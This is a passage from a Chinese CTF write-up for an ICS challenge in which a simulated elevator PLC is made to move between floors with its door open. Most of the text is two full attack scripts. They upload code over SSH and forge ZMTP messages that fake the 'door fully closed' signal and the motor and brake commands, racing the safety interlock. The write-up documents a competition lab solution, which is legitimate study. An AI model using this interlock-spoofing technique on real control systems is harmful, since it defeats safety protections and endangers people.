> 来源：https://github.com/fjh1997/nepctf2026-writeup/blob/main/writeup/WriteUp_%E5%AE%8C%E6%95%B4%E8%87%AA%E5%8C%85%E5%90%AB.md
> 以下为原始完整 writeup 中 #24 的连续章节摘录；代码未执行。

## #24 赛博心情电梯

### 1. 题目信息
- **题目名称**：赛博心情电梯
- **题目类型**：ICS
- **最终 Flag**：`NepCTF{9f323c33-47a4-6565-9e81-7e4e8a9500dc}`

### 2. 题目分析
赛博心情电梯还是同一套 CEIBA 软 PLC 风。题意很坏：门**开着**还要跨层走，还不能报警——因为正常联锁里 `bCanMove` 要求 `bDoorFullyClosed`。

我卡了很久在「只 spoof 关门位」：TUI 上 `motion` 一直 READY，门是 OPEN 了但轿厢根本不走。后来对照当年成功日志才发现——成功那次一上来就已经是 `('DOWN', '5', ...)`，轿厢本来就在行程里。

### 3. 解题思路
能打出 flag 的组合是：

1. 先让轿厢**真的**到高楼（比如 5）并形成行程；
2. 并行 micropython：在**真实门开**窗口 spoof `bDoorFullyClosed` + 电机方向；
3. TUI 狂点 OPEN + 呼低楼，让 DOWN/UP 跨层和 OPEN 叠在一起。

一键脚本：`work/24/repro/live_travel_then_spoof.py`（改 HOST/PORT）。

### 4. 解题过程
1. 开实例，SSH 通。
2. 上传 spoof / race 脚本。
3. 跑 `live_travel_then_spoof.py`：Phase1 到 5 楼 → Phase2 spoof+race4 → Phase3 呼 1 + 持续 OPEN。
4. 公告板出 flag 后提交。

比赛 flag：`NepCTF{9f323c33-47a4-6565-9e81-7e4e8a9500dc}`。  
复现 live 曾打出 `NepCTF{9ff63c36-1bca-655f-ad6b-7e2640180088}`（实例动态）。

这题写 WP 时我特地标了错误路径，免得后人再只 spoof 关门位喵……

### 5. 解题代码

下面贴的是我这边实际用过、并且复现能跑通的脚本全文。路径按 work 目录保留，方便对照。

#### `work/24/repro/live_travel_then_spoof.py`
```python
#!/usr/bin/env python3
"""#24: (1) legit TUI travel to floor 5 (2) call floor 1 for DOWN (3) open+spoof during travel."""
import paramiko, time, re, sys, threading

HOST = "114.66.24.233"
PORT = 31537
GOT = "/home/catcatyu/nepctf/work/24/repro/got_flag.txt"
LOGF = "/home/catcatyu/nepctf/work/24/repro/live_travel.log"
TUIF = "/home/catcatyu/nepctf/work/24/repro/live_travel_tui.bin"
WAITF = "/home/catcatyu/nepctf/work/24/repro/live_travel_wait.out"

# Spoof only while door open OR while motion already down (blast closed+motor)
SPOOF = r'''
import struct,socket,time
def gai(h,p):
 return socket.getaddrinfo(h,p,0,socket.SOCK_STREAM)[0][-1]
def recv_exact(s,n):
 b=b""
 while len(b)<n:
  c=s.recv(n-len(b))
  if not c: raise OSError("x")
  b+=c
 return b
def zmtp_greet_recv(s): return recv_exact(s,64)
def zmtp_greet_send(s,socktype,identity=None):
 zg=bytearray(64); zg[0]=0xFF; zg[9]=0x7F; zg[10]=3; zg[11]=0; zg[12:16]=b"NULL"; s.send(bytes(zg))
 meta=b"\x0bSocket-Type"+struct.pack("!I",len(socktype))+socktype
 if identity is not None: meta+=b"\x08Identity"+struct.pack("!I",len(identity))+identity
 body=b"\x05READY"+meta; s.send(bytes([0x04,len(body)])+body)
def zmtp_recv_frame(s):
 flags=recv_exact(s,1)[0]
 if flags&0x02: ln=struct.unpack("!Q",recv_exact(s,8))[0]
 else: ln=recv_exact(s,1)[0]
 return flags, (recv_exact(s,ln) if ln else b"")
def zmtp_recv_msg(s):
 parts=[]
 while True:
  f,d=zmtp_recv_frame(s); parts.append(d)
  if not (f&0x01): break
 return parts
def zmtp_send_frame(s,data,more=False):
 flags=0x01 if more else 0x00
 if len(data)>255: s.send(bytes([flags|0x02])+struct.pack("!Q",len(data))+data)
 else: s.send(bytes([flags,len(data)])+data)
def connect_pub(host,port,identity=None):
 s=socket.socket(); s.settimeout(5); s.connect(gai(host,port))
 try: s.setsockopt(socket.IPPROTO_TCP,1,1)
 except: pass
 zmtp_greet_recv(s); zmtp_greet_send(s,b"PUB",identity=identity)
 for _ in range(8):
  f,d=zmtp_recv_frame(s)
  if b"READY" in d: break
 return s
def connect_sub(host,port):
 s=socket.socket(); s.settimeout(5); s.connect(gai(host,port))
 zmtp_greet_recv(s); zmtp_greet_send(s,b"SUB")
 for _ in range(8):
  f,d=zmtp_recv_frame(s)
  if b"READY" in d: break
 zmtp_send_frame(s,b"\x01"); return s
def build_bool(instance, field, value=1):
 if isinstance(instance,str): instance=instance.encode()
 if isinstance(field,str): field=field.encode()
 o=bytearray()
 o+=struct.pack("<I",1)
 o+=struct.pack("<I",len(instance)); o+=struct.pack("<I",0); o+=instance
 o+=struct.pack("<I",len(field)); o+=struct.pack("<I",0); o+=field
 o+=struct.pack("<I",0x1E); o+=struct.pack("<I",0); o+=struct.pack("<H",value&0xFFFF)
 return bytes(o)
def build_array5(instance, field, true_idx, cmd=0, typ=8):
 if isinstance(instance,str): instance=instance.encode()
 if isinstance(field,str): field=field.encode()
 vb=bytearray(struct.pack("<I",5)+bytes(9))
 if 1<=true_idx<=5: vb[4+true_idx-1]=1
 o=bytearray()
 o+=struct.pack("<I",cmd)
 o+=struct.pack("<I",len(instance)); o+=struct.pack("<I",0); o+=instance
 o+=struct.pack("<I",len(field)); o+=struct.pack("<I",0); o+=field
 o+=struct.pack("<I",typ); o+=struct.pack("<I",0); o+=bytes(vb)
 return bytes(o)
def wire(topic, body):
 if isinstance(topic,str): topic=topic.encode()
 return bytes([0x01,len(topic)])+topic+bytes([0x00,len(body)])+body
def is_door_open(db):
  if not db or len(db)<40: return False
  if b"\x64" in db[16:40]: return True
  return db[24]!=1 or db[20]!=0 or db[16]!=0

door=connect_sub("127.1.0.17",6270)
pos=connect_sub("127.1.0.11",6210)
hmi=connect_sub("127.1.0.19",6290)
pubs=[]
for ident in (b"door_operator", b"elevator_controller"):
  pubs.append(connect_pub("127.1.0.11",6211,identity=ident))
  pubs.append(connect_pub("127.1.0.16",6261,identity=ident))
  pubs.append(connect_pub("127.1.0.12",6221,identity=ident))
  pubs.append(connect_pub("127.1.0.17",6271,identity=ident))
  pubs.append(connect_pub("127.1.0.10",6201,identity=ident))
print("spoof loop 120s")
t_end=time.time()+120
n=0; last_pos=None; floors=set()
while time.time()<t_end:
  try:
    door.settimeout(0.08); m=zmtp_recv_msg(door); db=m[-1] if m else None
  except: db=None
  open_now = bool(db and is_door_open(db))
  # always inject car calls 5 and 1 (help travel)
  for idx in (5,1,4,2,3):
    body=build_array5("interaction_button_instance","bRequestCar",idx,cmd=0,typ=8)
    body2=build_array5("elevator_controller_instance","bCarBtn",idx,cmd=0,typ=8)
    for pub in pubs:
      try:
        pub.send(wire("cmd/interaction_button/", body))
        pub.send(wire("cmd/elevator_controller/", body2))
      except: pass
  # door open cmd
  for pub in pubs:
    try:
      pub.send(wire("cmd/door_operator/", build_bool("door_operator_instance","bDoorOpenCmd",1)))
      pub.send(wire("cmd/elevator_controller/", build_bool("elevator_controller_instance","bDoorOpenBtn",1)))
    except: pass
  # if open: spoof closed + motor down (unsafe)
  if open_now:
    blast=[]
    for inst,topic in (
      ("position_status_sensor_instance","cmd/position_status_sensor/"),
      ("vfd_instance","cmd/vfd/"),
      ("vfd_drive_instance","cmd/vfd_drive/"),
      ("door_operator_instance","cmd/door_operator/"),
    ):
      for fld,val in (("bDoorFullyClosed",1),("bDriveEnable",1),("bMotorDown",1),("bMotorUp",0),("bBrakeRelease",1)):
        blast.append(wire(topic, build_bool(inst,fld,val)))
    pkt=b"".join(blast)
    for pub in pubs:
      try: pub.send(pkt)
      except: pass
  try:
    pos.settimeout(0.05); m=zmtp_recv_msg(pos); pb=m[-1] if m else None
    if pb:
      if last_pos is None: last_pos=pb
      elif pb[16:48]!=last_pos[16:48]:
        print("MOVED", last_pos[16:48].hex(), "->", pb[16:48].hex()); last_pos=pb
  except: pass
  try:
    hmi.settimeout(0.05); m=zmtp_recv_msg(hmi); hb=m[-1] if m else None
    if hb and b"NepCTF" in hb:
      print("FLAG", bytes([c if 32<=c<127 else 46 for c in hb])); break
  except: pass
  n+=1
  if n%250==0: print("tick",n,"open",open_now)
print("done",n)
'''


def drain(ch, t=1.0):
    end = time.time() + t
    data = b""
    while time.time() < end:
        try:
            chunk = ch.recv(65535)
            if chunk:
                data += chunk
                end = max(end, time.time() + 0.35)
            else:
                break
        except Exception:
            time.sleep(0.02)
    return data


def mouse_click(row, col):
    return f"\x1b[<0;{col};{row}M\x1b[<32;{col};{row}M"


def connect(user, pw):
    c = paramiko.SSHClient()
    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    c.connect(HOST, port=PORT, username=user, password=pw, timeout=20,
              allow_agent=False, look_for_keys=False, banner_timeout=25)
    return c


def strip_ansi(b):
    return re.sub(rb"\x1b\[[0-9;?]*[a-zA-Z]|\x1b\][^\x07\x1b]*(?:\x07|\x1b\\)|\x1b.", b" ", b)


def parse_state(plain):
    # last motion/floor/door
    motion = floor = door = None
    for m in re.finditer(r"motion=(\w+)\s+floor=(\d+)", plain):
        motion, floor = m.group(1), int(m.group(2))
        win = plain[m.start():m.start()+300]
        d = re.search(r"(OPENING|OPEN|CLOSING|CLOSED)\s+(\d+)%", win)
        if d:
            door = d.group(0)
    return motion, floor, door


def main():
    log = []
    def pr(*a):
        s = " ".join(str(x) for x in a)
        print(s, flush=True)
        log.append(s)

    open("/home/catcatyu/nepctf/work/24/spoof_travel.py", "w").write(SPOOF)
    c = connect("upload", "upload")
    sftp = c.open_sftp()
    sftp.put("/home/catcatyu/nepctf/work/24/spoof_travel.py", "/files/spoof_travel.py")
    sftp.put("/home/catcatyu/nepctf/work/24/repro/race4.py", "/files/race4.py")
    sftp.close(); c.close()
    pr("uploaded")

    # TUI session first (observe only while driving)
    c2 = connect("tui", "tui")
    ch2 = c2.invoke_shell(term="xterm-256color", width=100, height=40)
    ch2.settimeout(0.3)
    time.sleep(1.5)
    tui = drain(ch2, 2.0)

    def click_floors(targets, open_too=False, rounds=3, delay=0.1):
        # Approximate car panel: floors 1..5 across row 13-15 cols ~7,13,19,25,31
        floor_cols = {1: 7, 2: 13, 3: 19, 4: 25, 5: 31}
        for _ in range(rounds):
            for f in targets:
                col = floor_cols.get(f, 7)
                for row in (13, 14, 15):
                    ch2.send(mouse_click(row, col))
                    time.sleep(delay)
            if open_too:
                for col in range(6, 26, 1):
                    for row in (15, 16, 17):
                        ch2.send(mouse_click(row, col))
                    time.sleep(0.01)
            time.sleep(0.6)

    def snap(label=""):
        nonlocal tui
        tui += drain(ch2, 0.8)
        plain = strip_ansi(tui).decode("utf-8", "replace")
        st = parse_state(plain)
        pr("STATE", label, st)
        return st

    st = snap("boot")

    # Phase 1: go to floor 5 without spoof (pure TUI)
    pr("PHASE1 go floor 5")
    t_end = time.time() + 50
    while time.time() < t_end:
        click_floors([5], open_too=False, rounds=2, delay=0.08)
        # also hall-ish right side
        for row in range(11, 18):
            for col in (62, 66, 70, 74):
                ch2.send(mouse_click(row, col))
                time.sleep(0.02)
        st = snap("p1")
        if st[1] == 5 and st[0] in ("READY", "UP", None):
            # wait until READY at 5
            if st[0] == "READY" or st[1] == 5:
                # if floor is 5, good enough
                if st[1] == 5 and st[0] != "UP":
                    pr("arrived floor 5-ish", st)
                    break
        if st[1] == 5:
            pr("at floor 5 motion", st[0])
            if st[0] == "READY":
                break

    # Phase 2: start spoof + race4 on ctf
    pr("PHASE2 start spoof+race4")
    c1 = connect("ctf", "ctf")
    ch1 = c1.invoke_shell(term="xterm", width=140, height=40)
    ch1.settimeout(0.3)
    time.sleep(0.5)
    drain(ch1, 1)
    ch1.send("micropython /files/spoof_travel.py\n")
    time.sleep(1.2)
    pr("spoof_start", drain(ch1, 1).decode("utf-8", "replace")[-200:])

    # also race4 in parallel channel
    c3 = connect("ctf", "ctf")
    ch3 = c3.invoke_shell(term="xterm", width=140, height=40)
    ch3.settimeout(0.3)
    time.sleep(0.5)
    drain(ch3, 1)
    ch3.send("micropython /files/race4.py\n")
    time.sleep(0.5)

    # Phase 3: call floor 1 + keep open while DOWN
    pr("PHASE3 call floor 1 + open hold")
    t_end = time.time() + 70
    events = []
    prev = None
    while time.time() < t_end:
        click_floors([1, 5], open_too=True, rounds=1, delay=0.05)
        # continuous open band
        for col in range(6, 28):
            ch2.send(mouse_click(16, col))
            ch2.send(mouse_click(15, col))
        tui += drain(ch2, 0.2)
        w = drain(ch1, 0.05) + drain(ch3, 0.05)
        if w:
            open(WAITF, "ab").write(w)
            if b"NepCTF" in w or b"FLAG" in w:
                pr("WAIT_FLAG", w.decode("utf-8", "replace")[-500:])
        plain = strip_ansi(tui).decode("utf-8", "replace")
        # emit new events
        for m in re.finditer(r"motion=(\w+)\s+floor=(\d+)", plain[-8000:]):
            win = plain[m.start():m.start()+300]
            door = re.search(r"(OPENING|OPEN|CLOSING|CLOSED)\s+(\d+)%", win)
            e = (m.group(1), m.group(2), door.group(0) if door else "?")
            if e != prev:
                pr("TUI", e)
                events.append(e)
                prev = e
        if re.search(r"NepCTF\{[^}]+\}", plain):
            break
        # success condition: DOWN across floors with OPEN
        downs = [e for e in events if e[0] == "DOWN"]
        floors_down = {e[1] for e in downs}
        if len(floors_down) >= 2 and any("OPEN" in e[2] for e in downs):
            pr("CROSS_DOWN_OPEN floors", floors_down)
            # keep a bit more for flag
            time.sleep(3)
            tui += drain(ch2, 2)
            break

    # final collect
    out = drain(ch1, 8) + drain(ch3, 8)
    open(WAITF, "ab").write(out)
    open(TUIF, "wb").write(tui)
    plain = strip_ansi(tui).decode("utf-8", "replace") + out.decode("utf-8", "replace")
    flags = re.findall(r"NepCTF\{[^}]+\}", plain)
    for f in flags:
        pr("FLAG", f)
    if flags:
        open(GOT, "w").write(flags[0] + "\n")
        pr("WROTE", GOT)
    # summary motions
    motions = sorted({e[0] for e in events})
    floors = sorted({e[1] for e in events})
    pr("summary motions", motions, "floors", floors, "n_events", len(events))
    open(LOGF, "w").write("\n".join(log))
    for ch, c in ((ch1, c1), (ch2, c2), (ch3, c3)):
        try:
            ch.close(); c.close()
        except Exception:
            pass
    return 0 if flags else 1


if __name__ == "__main__":
    sys.exit(main())
```

#### `work/24/repro/race4.py`
```python

import struct, socket, time

def gai(h,p):
 return socket.getaddrinfo(h,p,0,socket.SOCK_STREAM)[0][-1]
def recv_exact(s,n):
 b=b""
 while len(b)<n:
  c=s.recv(n-len(b))
  if not c: raise OSError("closed")
  b+=c
 return b
def zmtp_greet_recv(s): return recv_exact(s,64)
def zmtp_greet_send(s,socktype,identity=None):
 zg=bytearray(64); zg[0]=0xFF; zg[9]=0x7F; zg[10]=3; zg[11]=0; zg[12:16]=b"NULL"; s.send(bytes(zg))
 meta=b"\x0bSocket-Type"+struct.pack("!I",len(socktype))+socktype
 if identity is not None: meta+=b"\x08Identity"+struct.pack("!I",len(identity))+identity
 body=b"\x05READY"+meta; s.send(bytes([0x04,len(body)])+body)
def zmtp_recv_frame(s):
 flags=recv_exact(s,1)[0]
 if flags&0x02: ln=struct.unpack("!Q",recv_exact(s,8))[0]
 else: ln=recv_exact(s,1)[0]
 return flags, (recv_exact(s,ln) if ln else b"")
def zmtp_recv_msg(s):
 parts=[]
 while True:
  f,d=zmtp_recv_frame(s); parts.append(d)
  if not (f&0x01): break
 return parts
def zmtp_send_frame(s,data,more=False):
 flags=0x01 if more else 0x00
 if len(data)>255: s.send(bytes([flags|0x02])+struct.pack("!Q",len(data))+data)
 else: s.send(bytes([flags,len(data)])+data)
def zmtp_send_msg(s,parts):
 for i,p in enumerate(parts):
  zmtp_send_frame(s,p,more=(i<len(parts)-1))
def connect_pub(host,port,identity=None):
 s=socket.socket(); s.settimeout(5); s.connect(gai(host,port))
 zmtp_greet_recv(s); zmtp_greet_send(s,b"PUB",identity=identity)
 for _ in range(8):
  f,d=zmtp_recv_frame(s)
  if b"READY" in d: break
 return s
def connect_sub(host,port):
 s=socket.socket(); s.settimeout(5); s.connect(gai(host,port))
 zmtp_greet_recv(s); zmtp_greet_send(s,b"SUB")
 for _ in range(8):
  f,d=zmtp_recv_frame(s)
  if b"READY" in d: break
 zmtp_send_frame(s,b"\x01"); return s

def build_bool(instance, field, value=1):
 if isinstance(instance,str): instance=instance.encode()
 if isinstance(field,str): field=field.encode()
 o=bytearray()
 o+=struct.pack("<I",1)
 o+=struct.pack("<I",len(instance)); o+=struct.pack("<I",0); o+=instance
 o+=struct.pack("<I",len(field)); o+=struct.pack("<I",0); o+=field
 o+=struct.pack("<I",0x1E); o+=struct.pack("<I",0); o+=struct.pack("<H",value&0xFFFF)
 return bytes(o)

def build_array5(instance, field, true_idx, cmd=0, typ=8):
 # value: u32 5 + 5 bools + pad4 = 13 bytes (matches pcap length style)
 if isinstance(instance,str): instance=instance.encode()
 if isinstance(field,str): field=field.encode()
 vb=bytearray(struct.pack("<I",5)+bytes(9))
 if 1<=true_idx<=5:
  vb[4+true_idx-1]=1
 o=bytearray()
 o+=struct.pack("<I",cmd)
 o+=struct.pack("<I",len(instance)); o+=struct.pack("<I",0); o+=instance
 o+=struct.pack("<I",len(field)); o+=struct.pack("<I",0); o+=field
 o+=struct.pack("<I",typ); o+=struct.pack("<I",0); o+=bytes(vb)
 return bytes(o)

def send(pub, topic, body):
 if isinstance(topic,str): topic=topic.encode()
 zmtp_send_msg(pub,[topic,body])

def drain_one(s, n=8):
 s.settimeout(0.2)
 last=None
 for _ in range(n):
  try:
   m=zmtp_recv_msg(s)
   if m: last=m[-1]
  except: break
 return last

print("connect")
pos=connect_sub("127.1.0.11",6210)
door=connect_sub("127.1.0.17",6270)
hmi=connect_sub("127.1.0.19",6290)
ctrl=connect_sub("127.1.0.10",6200)
vfd=connect_sub("127.1.0.16",6260)
ib=connect_sub("127.1.0.12",6220)

pubs={}
for name,ip,port in [
 ("interaction_button","127.1.0.12",6221),
 ("elevator_controller","127.1.0.10",6201),
 ("door_operator","127.1.0.17",6271),
 ("position_status_sensor","127.1.0.11",6211),
 ("vfd_drive","127.1.0.16",6261),
 ("hmi_panel","127.1.0.19",6291),
]:
 pubs[name]=connect_pub(ip,port,identity=b"hmi_panel")
 print("pub",name)

def read_floor(body):
 if not body or len(body)<28: return None
 return struct.unpack_from("<I", body, 24)[0]

def read_door(body):
 if not body or len(body)<28: return None,None,None
 # off16 opening?, off20 fully open/closed?, off24 pct
 b16=struct.unpack_from("<I", body, 16)[0]
 b20=struct.unpack_from("<I", body, 20)[0]
 pct=struct.unpack_from("<I", body, 24)[0]
 return b16,b20,pct

def snap(tag):
 pb=drain_one(pos,12); db=drain_one(door,12); hb=drain_one(hmi,12); cb=drain_one(ctrl,8); vb=drain_one(vfd,8)
 fl=read_floor(pb); d=read_door(db)
 print(tag,"floor",fl,"door",d,"pos",pb.hex() if pb else None)
 print("  doorhex", db.hex() if db else None)
 print("  hmi", hb.hex() if hb else None)
 if hb and b"NepCTF" in hb: print("FLAG",hb)
 return fl,d,pb,db,hb

snap("idle")
# determine floor
fl,d,pb,db,hb=snap("idle2")
if not fl or fl<1 or fl>5:
 fl=3
print("using floor", fl)

# Phase1: call CURRENT floor many ways to open door
print("call current floor", fl)
t_end=time.time()+5.0
while time.time()<t_end:
  # interaction button request car array
  send(pubs["interaction_button"],"cmd/interaction_button/", build_array5("interaction_button_instance","bRequestCar",fl,cmd=0,typ=8))
  send(pubs["interaction_button"],"cmd/interaction_button/", build_array5("interaction_button_instance","bRequestCar",fl,cmd=1,typ=8))
  # bool styles
  send(pubs["interaction_button"],"cmd/interaction_button/", build_bool("interaction_button_instance","bRequestCar",1))
  send(pubs["interaction_button"],"cmd/interaction_button/", build_bool("interaction_button_instance","bRequestCar[%d]"%fl,1))
  # hall at current
  if fl<5:
    send(pubs["interaction_button"],"cmd/interaction_button/", build_array5("interaction_button_instance","bRequestHallUp",fl,cmd=0,typ=8))
    send(pubs["interaction_button"],"cmd/interaction_button/", build_bool("interaction_button_instance","bRequestHallUp[%d]"%fl,1))
  if fl>1:
    send(pubs["interaction_button"],"cmd/interaction_button/", build_array5("interaction_button_instance","bRequestHallDown",fl,cmd=0,typ=8))
    send(pubs["interaction_button"],"cmd/interaction_button/", build_bool("interaction_button_instance","bRequestHallDown[%d]"%fl,1))
  # controller direct
  send(pubs["elevator_controller"],"cmd/elevator_controller/", build_array5("elevator_controller_instance","bCarBtn",fl,cmd=0,typ=8))
  send(pubs["elevator_controller"],"cmd/elevator_controller/", build_array5("elevator_controller_instance","bCarBtn",fl,cmd=1,typ=0x1e))
  send(pubs["elevator_controller"],"cmd/elevator_controller/", build_bool("elevator_controller_instance","bCarBtn[%d]"%fl,1))
  send(pubs["elevator_controller"],"cmd/elevator_controller/", build_bool("elevator_controller_instance","bDoorOpenBtn",1))
  # also try pcap-exact val for bRequestCar: 13 bytes
  # raw from earlier sample was zeros - try setting bit for floor
  time.sleep(0.08)

fl,d,pb,db,hb=snap("after call current")

# Phase2: if door not open, try open btn spam + open cmd race vs controller
print("force door open race 4s")
t_end=time.time()+4.0
while time.time()<t_end:
  send(pubs["door_operator"],"cmd/door_operator/", build_bool("door_operator_instance","bDoorOpenCmd",1))
  send(pubs["door_operator"],"cmd/door_operator/", build_bool("door_operator_instance","bDoorCloseCmd",0))
  send(pubs["door_operator"],"cmd/door_operator/", build_bool("door_operator_instance","bDriveEnable",0))
  send(pubs["elevator_controller"],"cmd/elevator_controller/", build_bool("elevator_controller_instance","bDoorOpenBtn",1))
  send(pubs["elevator_controller"],"cmd/elevator_controller/", build_bool("elevator_controller_instance","bDoorOpen",1))
  send(pubs["interaction_button"],"cmd/interaction_button/", build_bool("interaction_button_instance","bRequestDoorOpen",1))
  time.sleep(0.05)
fl,d,pb,db,hb=snap("after force door")

# Phase3: regardless, try unsafe: keep door open cmds + spoof move
# target move UP if fl<5 else DOWN
motor_up = 1 if fl < 5 else 0
motor_down = 1 if fl >= 5 else 0
print("unsafe race 12s motor_up",motor_up,"motor_down",motor_down)
t_end=time.time()+12.0
n=0
start_floor=fl
while time.time()<t_end:
  # door keep open
  send(pubs["door_operator"],"cmd/door_operator/", build_bool("door_operator_instance","bDoorOpenCmd",1))
  send(pubs["door_operator"],"cmd/door_operator/", build_bool("door_operator_instance","bDoorCloseCmd",0))
  send(pubs["door_operator"],"cmd/door_operator/", build_bool("door_operator_instance","bDriveEnable",0))
  # also try set fully open flags
  send(pubs["door_operator"],"cmd/door_operator/", build_bool("door_operator_instance","bDoorFullyOpen",1))
  send(pubs["door_operator"],"cmd/door_operator/", build_bool("door_operator_instance","bDoorFullyClosed",0))
  # spoof position/vfd closed+drive
  for dev in ("position_status_sensor","vfd_drive"):
    inst=dev+"_instance"; pub=pubs[dev]; topic="cmd/%s/"%dev
    send(pub,topic, build_bool(inst,"bDoorFullyClosed",1))
    send(pub,topic, build_bool(inst,"bDriveEnable",1))
    send(pub,topic, build_bool(inst,"bMotorUp",motor_up))
    send(pub,topic, build_bool(inst,"bMotorDown",motor_down))
    send(pub,topic, build_bool(inst,"bBrakeRelease",1))
  # controller
  send(pubs["elevator_controller"],"cmd/elevator_controller/", build_bool("elevator_controller_instance","bDriveEnable",1))
  send(pubs["elevator_controller"],"cmd/elevator_controller/", build_bool("elevator_controller_instance","bMotorUp",motor_up))
  send(pubs["elevator_controller"],"cmd/elevator_controller/", build_bool("elevator_controller_instance","bMotorDown",motor_down))
  send(pubs["elevator_controller"],"cmd/elevator_controller/", build_bool("elevator_controller_instance","bBrakeRelease",1))
  # keep call at current? and target floor
  tgt = fl+1 if motor_up else fl-1
  if 1<=tgt<=5:
    send(pubs["interaction_button"],"cmd/interaction_button/", build_array5("interaction_button_instance","bRequestCar",tgt,cmd=0,typ=8))
  n+=1
  time.sleep(0.06)
  if n%20==0:
    fl2,d2,pb2,db2,hb2=snap("mid n=%d"%n)
    if fl2 and start_floor and fl2!=start_floor:
      print("FLOOR CHANGED",start_floor,"->",fl2,"door",d2)
    if d2 and d2[2] and d2[2]>0:
      print("DOOR OPEN pct",d2[2])

fl,d,pb,db,hb=snap("final")
print("DONE start_floor",start_floor,"end",fl,"door",d)
if hb:
  txt=bytes([c if 32<=c<127 else 46 for c in hb])
  print("hmi txt",txt)
  if b"NepCTF" in hb: print("FLAGFOUND",hb)
```

### 6. AI 使用说明
这题用了 Claude Code / 偶尔 Grok 帮我盯日志和搓草稿；关键判断、踩坑取舍和最终提交是我自己点的。会话可以按题名在 `~/.claude/projects` 里翻。

---

